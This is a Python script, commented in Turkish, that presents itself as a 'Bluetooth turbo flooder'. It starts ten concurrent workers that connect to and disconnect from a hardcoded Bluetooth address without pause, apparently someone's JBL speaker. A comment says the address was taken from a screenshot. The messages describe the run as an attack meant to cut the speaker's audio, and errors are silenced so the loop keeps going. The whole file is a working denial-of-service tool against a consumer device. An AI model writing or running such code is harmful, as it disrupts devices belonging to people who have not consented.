import asyncio
from bleak import BleakClient

print("--- BLUETOOTH TURBO FLOODER (WINDOWS) ---")
# JBL'in adresini buraya direkt yazıyorum (Ekran görüntüsünden aldım)
target_address = "51:4E:FA:98:C6:01"

print(f"🔥 HEDEF: {target_address}")
print("🔥 AYNI ANDA 10 KOLDAN BAĞLANTI SALDIRISI BAŞLATILIYOR...")
print("Durdurmak için CTRL+C yap.")

async def attack_worker(worker_id):
    print(f"[{worker_id}] Saldırıcı hazır...")
    while True:
        try:
            async with BleakClient(target_address, timeout=0.5) as client:
                print(f"[{worker_id}] ⚔️ BAĞLANDI! (Ses kesilmiş olabilir)")
                await client.disconnect()
        except Exception:
            # Hata mesajlarını gizle ki ekran kirlenmesin, sadece saldırsın
            pass
        
        # Bekleme süresini neredeyse sıfıra indiriyoruz
        await asyncio.sleep(0.01)

async def main():
    # Aynı anda 10 tane saldırı döngüsü başlatıyoruz
    tasks = []
    for i in range(10):
        tasks.append(asyncio.create_task(attack_worker(i)))
    
    # Hepsini aynı anda çalıştır
    await asyncio.gather(*tasks)

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("\nSaldırı durduruldu.")
except Exception as e:
    print(f"Hata: {e}")